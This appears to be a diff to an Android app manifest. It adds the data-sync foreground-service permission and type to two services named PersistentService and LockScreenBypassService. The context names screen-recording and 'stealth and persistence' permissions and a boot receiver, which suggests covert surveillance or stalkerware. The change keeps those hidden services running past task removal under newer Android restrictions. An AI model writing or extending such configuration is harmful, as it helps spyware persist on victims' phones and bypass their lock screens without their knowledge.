@@ -13,6 +13,7 @@
     <!-- Screen recording permissions -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     
     <!-- Stealth and persistence permissions -->
@@ -75,13 +76,15 @@
             android:name=".services.PersistentService"
             android:enabled="true"
             android:exported="false"
-            android:stopWithTask="false" />
+            android:stopWithTask="false"
+            android:foregroundServiceType="dataSync" />
             
         <service
             android:name=".services.LockScreenBypassService"
             android:enabled="true"
             android:exported="false"
-            android:stopWithTask="false" />
+            android:stopWithTask="false"
+            android:foregroundServiceType="dataSync" />
             
         <receiver
             android:name=".receivers.BootReceiver"
